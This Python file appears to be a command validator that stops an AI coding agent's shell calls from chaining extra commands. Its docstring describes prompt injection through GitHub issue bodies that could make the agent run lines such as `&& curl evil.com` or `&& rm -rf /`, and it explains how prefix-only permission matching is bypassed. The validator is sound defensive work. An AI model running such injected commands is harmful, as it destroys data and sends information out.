#!/usr/bin/env python3
"""Command validator for heartbeat Bash() calls.

Validates that shell commands match the heartbeat allowlist and contain no
shell metacharacters that could bypass prefix-only matching. Designed to be
used as a wrapper that heartbeat.sh invokes — the agent cannot bypass this
because it runs outside the agent's control.

Threat model: prompt injection via GitHub issue bodies could trick the agent
into running malicious commands like `git commit -m "x" && curl evil.com`.
Claude Code's Bash() permission uses prefix-only string matching, so
`Bash(git commit *)` matches `git commit -m x && rm -rf /`. This validator
closes that gap by rejecting commands with shell operators.

Usage:
    uv run python safe_bash.py validate "git commit -m 'fix bug'"
    uv run python safe_bash.py validate "git push -u origin HEAD && echo pwned"
    uv run python safe_bash.py check-all  # validate stdin (one command per line)
"""

import re
import sys

import click

# Shell metacharacters that enable command chaining/injection.
# These are the operators that bypass prefix-only matching.
SHELL_OPERATORS = re.compile(
    r"""
    (?:^|[^\\])       # not preceded by backslash
    (?:
        &&             # AND chain
        | \|\|         # OR chain
        | ;            # sequential
        | \|           # pipe
        | `            # backtick substitution
        | \$\(         # command substitution
        | \$\{         # parameter expansion (indirect)
        | >>?          # output redirection
        | <            # input redirection
        | \n           # newline (command separator)
    )
    """,
    re.VERBOSE,
)

# Allowed command prefixes. Must match heartbeat.sh --allowedTools exactly.
ALLOWED_PREFIXES = [
    "git status",
    "git diff ",
    "git log ",
    "git add ",
    "git commit ",
    "git checkout ",
    "git branch ",
    "git push ",
    "git pull ",
    "git fetch ",
    "git -C ",
    "git worktree ",
    "gh pr create ",
    "gh pr view ",
    "gh pr list ",
    "gh issue close ",
    "gh issue list ",
    "gh issue view ",
    "ls ",
    "mkdir ",
    "date ",
    "uv run python ",
]

# Commands that are exact matches (no trailing args).
ALLOWED_EXACT = [
    "git status",
]


def validate_command(cmd: str) -> tuple[bool, str]:
    """Validate a command against the allowlist and shell operator blocklist.

    Returns (is_valid, reason).
    """
    cmd = cmd.strip()
    if not cmd:
        return False, "empty command"

    # Check for shell operators first — this is the main security gate.
    if SHELL_OPERATORS.search(cmd):
        return False, f"shell operator detected in: {cmd!r}"

    # Check against allowlist.
    if cmd in ALLOWED_EXACT:
        return True, "exact match"

    for prefix in ALLOWED_PREFIXES:
        if cmd.startswith(prefix):
            return True, f"matches prefix: {prefix!r}"

    return False, f"no matching allowlist entry for: {cmd!r}"


@click.group()
def cli() -> None:
    """Heartbeat command validator."""


@cli.command()
@click.argument("command")
def validate(command: str) -> None:
    """Validate a single command. Exits 0 if allowed, 1 if rejected."""
    is_valid, reason = validate_command(command)
    if is_valid:
        click.echo(f"ALLOWED: {reason}")
    else:
        click.echo(f"REJECTED: {reason}", err=True)
        sys.exit(1)


@cli.command("check-all")
def check_all() -> None:
    """Validate commands from stdin, one per line. Report all results."""
    failures = 0
    total = 0
    for line in sys.stdin:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        total += 1
        is_valid, reason = validate_command(line)
        status = "ALLOWED" if is_valid else "REJECTED"
        click.echo(f"{status}: {line!r} — {reason}")
        if not is_valid:
            failures += 1

    click.echo(f"\n{total} commands checked, {failures} rejected")
    if failures:
        sys.exit(1)


if __name__ == "__main__":
    cli()
